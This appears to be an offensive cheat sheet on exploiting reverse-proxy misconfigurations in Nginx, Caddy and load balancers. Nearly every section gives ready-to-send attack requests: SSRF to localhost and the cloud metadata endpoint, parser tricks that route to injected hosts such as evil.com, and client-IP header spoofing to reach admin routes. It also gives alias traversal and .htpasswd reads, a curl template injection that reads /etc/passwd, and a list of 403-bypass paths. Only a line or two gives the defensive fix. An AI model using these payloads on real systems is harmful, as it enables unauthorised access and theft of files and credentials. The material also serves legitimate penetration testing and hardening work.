# Reverse-proxy misconfiguration — SSRF, header trust, path bypass, alias traversal — Open WHEN: a reverse proxy (Nginx/Caddy/load balancer) sits in front of the app and you need to reach internal routes, spoof a trusted client IP, or bypass a 40X on a path

The proxy's allowlist and the URL the back-end actually fetches often disagree.
Body has the summary; the runnable cases are here.

## Open forward-proxy (absolute-form request line)
A reverse proxy that accepts an absolute-URI request line acts as an open
proxy — full-read SSRF if the upstream body comes back instead of a 400.
```
GET http://127.0.0.1:8080/ HTTP/1.1
Host: whatever
```
```
GET http://169.254.169.254/latest/meta-data/ HTTP/1.1
Host: anything
```

## Proxy parser tricks (set the request line, not a url= param)
Leading `@`/`;`/`*` confuse the proxy's host parser so it routes to a host you
inject while the front rule still sees the original Host.
```
# Flask proxy: leading @host treated as userinfo, injects new host
GET @evildomain.com/ HTTP/1.1
Host: target.com
```
```
# Spring Boot: path starting with ; then @host
GET ;@evil.com/url HTTP/1.1
Host: target.com
```
```
# PHP built-in server: * before slash, dotless-hex IP
GET *@0xa9fea9fe/ HTTP/1.1
Host: target.com
```

## Spoofable client-IP headers (trusted-origin bypass)
`X-Forwarded-For`, `X-Real-IP`, `True-Client-IP` (Akamai), `X-Client-IP`,
`X-Originating-IP`, `CF-Connecting-IP` are plain headers. If the proxy does
not strip or override them before forwarding, the back-end trusts your value.
```
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
```
Use to reach IP-gated internal/admin routes ("only from localhost / office
range"). A correct proxy sets `proxy_set_header X-Forwarded-For $remote_addr;`
(overwrites, does not append) — its absence is the bug.
`X-Forwarded-Host` / `Host` rewrites also re-route header-routed back ends.

## Nginx alias off-by-slash (directory traversal above the alias root)
A `location` without a trailing slash bound to an `alias` with one lets the
suffix climb out of the mapped directory.
```nginx
location /styles {        # NOTE: no trailing slash
    alias /path/css/;
}
```
Request `/styles../secret.txt` resolves to `/path/css/../secret.txt` ->
`/path/secret.txt`. Probe: append `../` chains to any `location`-prefixed path
and watch for files above the served root. Tooling concept: alias-traversal
scanners (e.g. "Kyubi", gixy static analysis) — but a manual `../` probe with
`curl` finds most.

## Nginx missing root location
With a top-level `root /etc/nginx;` and no `location / {}`, unmatched paths are
served straight from that root.
```
GET /nginx.conf      -> /etc/nginx/nginx.conf
GET /.htpasswd       -> /etc/nginx/.htpasswd
```

## Caddy `templates` directive -> SSTI / file read
If a Caddyfile renders a header value through Go templates, inject template
funcs in that header.
```
curl -H 'Referer: {{readFile "/etc/passwd"}}' http://target/
```
| Template input | Effect |
|---|---|
| `{{readFile "path"}}` | read a file into the response |
| `{{env "VAR"}}` | read an environment variable |
| `{{listFiles "/"}}` | list a directory |

## 403 / 40X path bypass (reach a proxy-blocked path)
A path blocked at the proxy is frequently still routable to the upstream via
casing, encoding, traversal-ish suffixes, or extra segments. Try with `curl`
against the blocked path:
```
/admin      -> /Admin /ADMIN              # casing
/admin      -> /admin/  /admin/.  /admin/..;/   # trailing variants
/admin      -> /%2e/admin  /./admin  /admin%2f  # encoded slash/dot
/admin      -> /admin..;/  /admin#  /admin?  /admin%20
/admin      -> //admin  /./admin/./
```
Also retry each variant with the spoofable client-IP headers above set to
`127.0.0.1`. The `bypass-url-parser` project enumerates the full matrix of
these; the high-yield subset above covers most Nginx/Caddy/ALB cases by hand.
